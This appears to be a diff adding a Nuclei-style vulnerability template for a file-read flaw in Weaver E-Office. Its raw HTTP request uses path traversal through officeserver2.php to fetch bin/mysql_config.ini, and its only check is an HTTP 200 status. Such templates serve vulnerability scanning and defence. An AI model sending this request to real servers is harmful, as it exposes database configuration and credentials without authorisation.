@@ -1,0 +1,34 @@
+id: poc-vnlk3ieptidibrw9
+info:
+  name: 泛微 E-Office文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vnlk3ieptidibrw9'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vnlk3ieptidibrw9
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
